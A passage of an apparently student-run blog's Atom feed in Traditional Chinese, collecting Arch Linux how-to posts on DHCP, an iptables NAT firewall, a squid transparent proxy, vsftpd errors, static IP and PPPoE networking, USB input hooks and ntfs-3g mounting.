&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;fixed-address&lt;/span&gt; &lt;span class="err"&gt;172.16.1.30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;為了讓 dhcpd 只 listen 特定的 interface&lt;br /&gt;
在 &lt;code&gt;/etc/conf.d/dhcp&lt;/code&gt; 中 把 &lt;code&gt;DHCP4_ARGS="-q"&lt;/code&gt; 改成 &lt;code&gt;DHCP4_ARGS="-q enp0s19"&lt;/code&gt;&lt;br /&gt;
然後 &lt;code&gt;# systemctl start dhcpd4&lt;/code&gt; 應該就能成功當起 dhcp server 了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;DHCP client (on www-q and mail-q)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_Configuration#Dynamic_IP_address"&gt;https://wiki.archlinux.org/index.php/Network_Configuration#Dynamic_IP_address&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一樣照著 arch wiki 作 預設應該就有裝 dhcpcd 了&lt;br /&gt;
&lt;code&gt;# dhcpcd enp0s18&lt;/code&gt;&lt;br /&gt;
這裡的 enp0s18 是內網網卡&lt;br /&gt;
然後 &lt;code&gt;# systemctl start dhcpcd@enp0s18&lt;/code&gt;&lt;br /&gt;
用 &lt;code&gt;$ lspci -k&lt;/code&gt; 察看跟網卡相關的 modules&lt;br /&gt;
結果如下  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;13.0&lt;/span&gt; &lt;span class="n"&gt;Ethernet&lt;/span&gt; &lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Realtek&lt;/span&gt; &lt;span class="n"&gt;Semiconductor&lt;/span&gt; &lt;span class="n"&gt;Co&lt;/span&gt;&lt;span class="o"&gt;.,&lt;/span&gt; &lt;span class="n"&gt;Ltd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;RTL&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="sr"&gt;/8139C/&lt;/span&gt;&lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rev&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;Subsystem&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Red&lt;/span&gt; &lt;span class="n"&gt;Hat&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Inc&lt;/span&gt; &lt;span class="n"&gt;Device&lt;/span&gt; &lt;span class="mi"&gt;1100&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;Kernel&lt;/span&gt; &lt;span class="n"&gt;driver&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="n"&gt;cp&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以可以知道在 &lt;code&gt;/etc/modules-load/realtek.conf&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;這邊卡關了一下是因為 dv 也在 140.113.27 網段底下架了一台 dhcp Server&lt;br /&gt;
結果我的 client 一直拿到他的 server 發出來的 ip 而不是我自己架的&lt;br /&gt;
看了鳥哥的網頁&lt;br /&gt;
&lt;a href="http://linux.vbird.org/linux_server/0340dhcp.php#client_linux"&gt;http://linux.vbird.org/linux_server/0340dhcp.php#client_linux&lt;/a&gt;&lt;br /&gt;
裏面有提到在 client 端上的 /var/lib/dhclient/ 裏面有跟租約相關的檔案&lt;br /&gt;
可以用 vim 開啟直接改寫&lt;br /&gt;
&lt;code&gt;option dhcp-server-identifier 172.16.1.254&lt;/code&gt; 指定 dhcp Server&lt;br /&gt;
可是在 archlinux 底下無法直接這樣改寫，用vim開起來會是亂碼&lt;br /&gt;
後來是在 client 端的 &lt;code&gt;/etc/dhcpcd.conf&lt;/code&gt; 中加上 &lt;code&gt;static routers=172.16.1.254&lt;/code&gt; 解決  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;NAT &amp;amp; Firewall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;In Linux we use iptables, while in FreeBSD we use PF  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0250simple_firewall.php"&gt;http://linux.vbird.org/linux_server/0250simple_firewall.php&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Internet_Share"&gt;https://wiki.archlinux.org/index.php/Internet_Share&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Simple_Stateful_Firewall"&gt;https://wiki.archlinux.org/index.php/Simple_Stateful_Firewall&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Iptables"&gt;https://wiki.archlinux.org/index.php/Iptables&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Router"&gt;https://wiki.archlinux.org/index.php/Router&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.revsys.com/writings/quicktips/nat.html"&gt;http://www.revsys.com/writings/quicktips/nat.html&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;
參考了以上的連結之後，目前 iptables 的設定如下  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*mangle                                                                        
:PREROUTING ACCEPT [369:34165]                                                  
:INPUT ACCEPT [278:20862]                                                      
:FORWARD ACCEPT [91:13303]                                                      
:OUTPUT ACCEPT [153:20248]                                                      
:POSTROUTING ACCEPT [244:33551]                                                
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013                                        
# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*filter                                                                        
:INPUT ACCEPT [3:418]                                                          
:FORWARD ACCEPT [91:13303]                                                      
:OUTPUT ACCEPT [153:20248]                                                      
:BADHOST - [0:0]                                                                
-A INPUT -j BADHOST                                                            
-A BADHOST -s 140.113.101.10 -j DROP                                            
-A INPUT -i enp0s18 -p icmp -m icmp --icmp-type 8 -j DROP                      
-A INPUT -m state --state INVALID -j DROP                                      
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT                        
-A INPUT -i lo -j ACCEPT                                                        
-A INPUT -i enp0s18 -s 140.113.230.88 -j ACCEPT                                
-A FORWARD -m state --state INVALID -j DROP                                    
-A FORWARD -s 140.113.17.0/24 -d 172.16.1.30 -p tcp --dport 21 -j REJECT --reject-with tcp-reset  
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT  
-A FORWARD -s 140.113.230.88 -d 172.16.1.30 -p tcp --dport 21:22 -j ACCEPT      
-A FORWARD -s 140.113.27.47 -d 172.16.1.30 -p tcp --dport 22 -j ACCEPT        
-A FORWARD -s 140.113.235.0/24 -d 172.16.1.30 -p tcp --dport 21 -j ACCEPT      
-A FORWARD -s 140.113.17.0/24 -d 172.16.1.30 -p tcp --dport 22 -j ACCEPT        
-A FORWARD -d 172.16.1.30 -p tcp --dport 21 -j DROP                            
-A FORWARD -d 172.16.1.30 -p tcp --dport 22 -j DROP                            
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013                                        
# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*nat                                                                            
:PREROUTING ACCEPT [2:426]                                                      
:INPUT ACCEPT [1:354]                                                          
:OUTPUT ACCEPT [0:0]                                                            
:POSTROUTING ACCEPT [1:60]                                                      
-A PREROUTING -i enp0s18 -p tcp --dport 21 -j DNAT --to-destination 172.16.1.30:21  
-A PREROUTING -i enp0s18 -p tcp --dport 222 -j DNAT --to-destination 172.16.1.30:22  
-A PREROUTING -s 172.16.1.0/24 -i enp0s19 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128  
-A POSTROUTING -s 172.16.1.0/24 -o enp0s18 -j MASQUERADE                        
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;140.113.230.88 是寢室的 ip&lt;br /&gt;
140.113.27.47 是社窩無網的ip&lt;br /&gt;
為了方便操作用  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Proxy&lt;/h2&gt;
&lt;h3&gt;ftp-proxy&lt;/h3&gt;
&lt;p&gt;好像在 iptables 就設定完了 根本不用像 FreeBSD 還要用 ftp-proxy&lt;br /&gt;
猜測是因為 &lt;code&gt;-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT&lt;/code&gt; 的緣故  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Squid"&gt;https://wiki.archlinux.org/index.php/Squid&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0420squid.php"&gt;http://linux.vbird.org/linux_server/0420squid.php&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;transparent http proxy&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;/etc/squid/squid.conf&lt;/code&gt; 中 &lt;code&gt;http_port&lt;/code&gt; 後面加上 &lt;code&gt;intercept&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;http_port 3128 intercept&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;鳥哥裏面是寫 &lt;code&gt;http_port 3128 transparent&lt;/code&gt;&lt;br /&gt;
在 &lt;a href="http://www.squid-cache.org/Doc/config/http_port/"&gt;http://www.squid-cache.org/Doc/config/http_port/&lt;/a&gt; 有寫到在 3.1 的版本以後&lt;br /&gt;
intercept - Rename of old 'transparent' option to indicate proper functionality.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把 &lt;code&gt;cache_dir ufs /var/cache/squid 256 16 256&lt;/code&gt; 的註解取消&lt;br /&gt;
再加上 &lt;code&gt;cache_mem 8 MB&lt;/code&gt; (預設是 8 MB 可以自己改)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;# squid -z&lt;/code&gt; (在 &lt;code&gt;/var/cache/squid/&lt;/code&gt; 建立資料夾)&lt;br /&gt;
&lt;code&gt;# squid -k check&lt;/code&gt; (檢查 &lt;code&gt;/etc/squid/squid.conf&lt;/code&gt; 有沒有問題)&lt;br /&gt;
&lt;code&gt;# systemctl start squid&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;之後在 iptables 的 nat table 中加上新的 rule,&lt;br /&gt;
把內網往外傳的 http request 轉到 squid 上&lt;br /&gt;
&lt;code&gt;-A PREROUTING -i enp0s19 -s 172.16.1.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128&lt;/code&gt;&lt;br /&gt;
然後 reload iptables  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;vsftpd&lt;/h2&gt;
&lt;p&gt;遇到兩個錯誤  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;500 OOPS: priv_sock_get_cmd&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;解決方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=147074"&gt;https://bbs.archlinux.org/viewtopic.php?id=147074&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt; 加上 &lt;code&gt;seccomp_sandbox=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;500 OOPS: vsftpd: refusing to run with writable root inside chroot()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;解決方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?post_id=236642"&gt;http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?post_id=236642&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;chmod a-w $dir&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;該 root dir 不可有寫入的權限  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;感想&lt;/h2&gt;
&lt;p&gt;用 Arch Linux 蠻方便的&lt;br /&gt;
基本上就照著鳥哥和 Arch Wiki 的教學邊做邊學應該就差不多了&lt;br /&gt;
不過跟上課教的好像差蠻多的XD&lt;br /&gt;
教的是 FreeBSD, PF&lt;br /&gt;
結果我用 Linux, iptables&lt;br /&gt;
這樣期中考真的沒問題嗎w?  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="iptables"></category><category term="Firewall"></category><category term="DHCP"></category><category term="NAT"></category><category term="sysadmin"></category></entry><entry><title>Setup Static Ip Wired Network in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/25/setup-static-ip-wired-network-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:11:00+08:00</published><updated>2015-10-27T22:11:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-25:posts/2013/02/25/setup-static-ip-wired-network-in-arch-linux/</id><summary type="html">&lt;p&gt;因為之前安裝 Arch 的時候是用 wireless network 只要用就好  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo wifi-menu  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;或者是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo wicd-gtk  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;Arch 預設沒有裝 wicd,&lt;br /&gt;
要使用的話請先用 &lt;code&gt;$ sudo pacman -S wicd-gtk&lt;/code&gt; 安裝 wicd 後就可以解決&lt;br /&gt;
在執行 wicd-gtk 之前 要先  &lt;code&gt;$ sudo wicd&lt;/code&gt;  把 wicd run 起來&lt;br /&gt;
不然會有錯誤訊息顯示  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上是無線網路的部份 設定很簡單 有線網路的設定就比較麻煩一點  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;寒假在家裡上網用 ADSL&lt;br /&gt;
照著上一篇的 &lt;a href="/posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/"&gt;[Arch Linux] Set up wired network with pppoe-setup&lt;/a&gt; 就可以完成  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;開學後回到宿舍 得設定 static ip&lt;br /&gt;
一開始想說用 &lt;code&gt;wicd-gtk&lt;/code&gt; 新增一個 wired connection&lt;br /&gt;
然後把該設定的 property 設定完應該就能用了&lt;br /&gt;
結果就是連不上 然後發現  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners%27_guide#Wired"&gt;Beginners' guide - ArchWiki&lt;/a&gt; 其實有講&lt;br /&gt;
不過我這裡的方法不太一樣就是 但基本上大同小異  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是我的作法：  &lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;/etc/network.d/&lt;/code&gt; 底下建立設定檔  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ vim /etc/network.d/ethernet-dorm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其內容如下 #為註解部分  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;CONNECTION=&amp;#39;ethernet&amp;#39;  
DESCRIPTION=&amp;#39;A basic static ethernet connection using iproute&amp;#39;  
INTERFACE=&amp;#39;enp2s0&amp;#39;  
IP=&amp;#39;static&amp;#39;  
ADDR=&amp;#39;140.113.69.103&amp;#39;  
GATEWAY=&amp;#39;140.113.69.254&amp;#39;  
DNS=(&amp;#39;8.8.8.8&amp;#39;, &amp;#39;8.8.4.4&amp;#39;, &amp;#39;140.113.1.1&amp;#39;, &amp;#39;140.113.6.2&amp;#39;)  

## For IPv6 autoconfiguration  
#IP6=stateless  

## For IPv6 static address configuration  
#IP6=&amp;#39;static&amp;#39;  
#ADDR6=(&amp;#39;1234:5678:9abc:def::1/64&amp;#39; &amp;#39;1234:3456::123/96&amp;#39;)  
#ROUTES6=(&amp;#39;abcd::1234&amp;#39;)  
#GATEWAY6=&amp;#39;1234:0:123::abcd&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用 &lt;code&gt;netcfg&lt;/code&gt; 這個指令  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo netcfg -u ethernet-dorm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣應該就可以啟動該網路連線了，如果設定都 OK 的話應該就會正常運作。  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="sysadmin"></category><category term="Network"></category></entry><entry><title>Setup PPPoE Wired Network in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:03:00+08:00</published><updated>2015-10-27T22:03:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-20:posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/</id><summary type="html">&lt;p&gt;照著 &lt;a href="https://wiki.archlinux.org/index.php/Direct_modem_connection"&gt;Direct modem connection - ArchWiki&lt;/a&gt; 這部份設定  &lt;/p&gt;
&lt;p&gt;下 &lt;code&gt;# pppoe-setup&lt;/code&gt; 的時候 跟我說 &lt;code&gt;command not found&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;查了一下才知道要先裝上 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;所以要設定之前記得先下  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo pacman -S rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝完後再照著上面 ArchWiki 的步驟設定應該就行了  &lt;/p&gt;
&lt;p&gt;之前不知道要安裝 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;結果跑去 ArchWiki 搜尋 &lt;code&gt;pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;跑出 &lt;a href="https://wiki.archlinux.org/index.php/pppd"&gt;pppd - ArchWiki&lt;/a&gt; 給我  &lt;/p&gt;
&lt;p&gt;照著做還是弄不起來 後來才知道要安裝 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;所以就是先 &lt;code&gt;$ sudo pacman -S rp-pppoe&lt;/code&gt; 後  &lt;/p&gt;
&lt;p&gt;再 &lt;code&gt;$ sudo pppoe-setup&lt;/code&gt; 就行了  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Network"></category><category term="rp-pppoe"></category><category term="PPPoE"></category></entry><entry><title>Arch Linux - USB鍵盤和USB滑鼠插上去卻無法使用的解法</title><link href="https://blog.m157q.tw/posts/2013/02/17/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:14:00+08:00</published><updated>2015-10-27T22:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-17:posts/2013/02/17/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/</id><summary type="html">&lt;p&gt;前幾天剛灌好 &lt;code&gt;Arch Linux x86_64&lt;/code&gt;&lt;br /&gt;
接上 USB外接滑鼠和鍵盤 竟然沒辦法使用 (我想用我的青軸鍵盤啊Q_Q)&lt;br /&gt;
光學滑鼠的紅色燈有亮 但不能動 鍵盤也沒反應&lt;br /&gt;
查了論壇上幾篇文章 有和我狀況類似的 可是照著弄還是不會動&lt;br /&gt;
大概都是問說有沒有在 &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; 裏面的 HOOKS 加入 usbinput  &lt;/p&gt;
&lt;p&gt;但參考了 &lt;a href="https://wiki.archlinux.org/index.php/Mkinitcpio#HOOKS"&gt;mkinitcpio - ArchWiki&lt;/a&gt; 後  &lt;/p&gt;
&lt;p&gt;裏面有著這行敘述  &lt;/p&gt;
&lt;p&gt;&lt;img alt="mkinitcpio" src="/files/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/mkinitcpio.png" /&gt;  &lt;/p&gt;
&lt;p&gt;意思是 &lt;code&gt;usbinput&lt;/code&gt; 在 &lt;code&gt;mkinitcpio 0.13.0&lt;/code&gt; 已經被合併到 keyboard 裏面了&lt;br /&gt;
所以只要在 &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; 裏面的 &lt;code&gt;HOOKS&lt;/code&gt; 加入 &lt;code&gt;keyboard&lt;/code&gt;&lt;br /&gt;
(HOOKS裏面應該已經有其他東西了)&lt;br /&gt;
加入後，以我的 &lt;code&gt;mkinitcpio.conf&lt;/code&gt; 為例，會長的像這樣  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;HOOKS="base udev autodetect modconf block filesystems keyboard fsck keymap"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;修改完後 一定要記得下  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo mkinitcpio -p linux  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(我就是忘記下這行指令才卡很久都沒外接滑鼠和鍵盤可以用=  =")  &lt;/p&gt;
&lt;p&gt;等他跑完 再把USB滑鼠和USB鍵盤插上去試試  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="USB"></category><category term="mkinitcpio"></category></entry><entry><title>用 ntfs-3g 自動 mount Windows 裡的 D 槽</title><link href="https://blog.m157q.tw/posts/2013/02/17/automatically-mount-windows-partition-by-using-ntfs-3g/" rel="alternate"></link><published>2015-10-28T15:14:00+08:00</published><updated>2015-10-28T15:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-17:posts/2013/02/17/automatically-mount-windows-partition-by-using-ntfs-3g/</id><summary type="html">&lt;p&gt;想在 Arch Linux 上 mount windows 裏面的 D 槽&lt;br /&gt;
因為之前用 Ubuntu 的時候 就一直拿 D 槽當作是共用的存檔地方&lt;br /&gt;
所以灌其他作業系統的時候也不太需要做啥備份  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;fstab&lt;/h2&gt;
&lt;p&gt;如果要讓 Linux 在開機的時候自動 mount D槽  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudoedit /etc/fstab&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;必須在 &lt;code&gt;/etc/fstab&lt;/code&gt; 中下寫類似這樣的 rule  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# /dev/sda5 (win_D)  
    UUID=01CC0B74E1BC55F0 /win_D ntfs-3g defaults,umask=000  0  2  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;UUID&lt;/h2&gt;
&lt;p&gt;之後使用 &lt;code&gt;$ lsblk -f&lt;/code&gt; 這個指令去察看要 &lt;code&gt;mount&lt;/code&gt; 的硬碟的 UUID&lt;br /&gt;
然後把該 UUID 填寫在 &lt;code&gt;UUID=&lt;/code&gt; 的後面&lt;br /&gt;
不知道什麼是 UUID 的可參考 &lt;a href="https://zh.wikipedia.org/zh-tw/%E9%80%9A%E7%94%A8%E5%94%AF%E4%B8%80%E8%AF%86%E5%88%AB%E7%A0%81"&gt;通用唯一識別碼 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;/win_D&lt;/code&gt; 是你要把 D 槽 mount 在哪個目錄底下 可以自行修改  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;ntfs-3g&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;ntfs-3g&lt;/code&gt; 不知道這是什麼的請見 &lt;a href="https://zh.wikipedia.org/zh-tw/NTFS-3G"&gt;NTFS-3G - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;這裡如果用 &lt;code&gt;ntfs&lt;/code&gt; 的話會造成無法寫入和修改權限&lt;br /&gt;
所以要用 &lt;code&gt;ntfs-3g&lt;/code&gt;&lt;br /&gt;
預設應該是沒安裝的&lt;br /&gt;
在 Arch Linux 請先  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo pacman -S ntfs-3g&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;defaults,umask=000 0 2&lt;/code&gt; 後面這 3 個部份  &lt;/p&gt;
&lt;p&gt;請參考  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fstab"&gt;fstab - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_basic/0230filesystem.php#fstab"&gt;鳥哥的 Linux 私房菜 -- 第七章、Linux 磁碟與檔案系統管理&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要其他不同的設定的話可以參考後 自行修改 &lt;code&gt;options&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;code&gt;umask&lt;/code&gt; 用 &lt;code&gt;000&lt;/code&gt; 是因為我這台是個人使用的筆電&lt;br /&gt;
為了方便存取 D 槽才這樣設定&lt;br /&gt;
因為 &lt;code&gt;mount&lt;/code&gt; 起來的 &lt;code&gt;owner&lt;/code&gt; 和 &lt;code&gt;group&lt;/code&gt; 都會是 root&lt;br /&gt;
反正只有我一個人用&lt;br /&gt;
設 &lt;code&gt;777&lt;/code&gt; 會比較方便 但相對安全性就變低了Orz  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="fstab"></category><category term="UUID"></category><category term="NTFS"></category><category term="ntfs-3g"></category></entry><entry><title>Font Config in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/16/font-config-in-arch-linux/" rel="alternate"></link><published>2015-10-28T15:27:00+08:00</published><updated>2015-10-28T15:27:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-16:posts/2013/02/16/font-config-in-arch-linux/</id><summary type="html">&lt;p&gt;漂亮的字型對一個好的使用環境來講真的非常重要  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中文字型我慣用 &lt;code&gt;LiHei Pro&lt;/code&gt;  &lt;/li&gt;
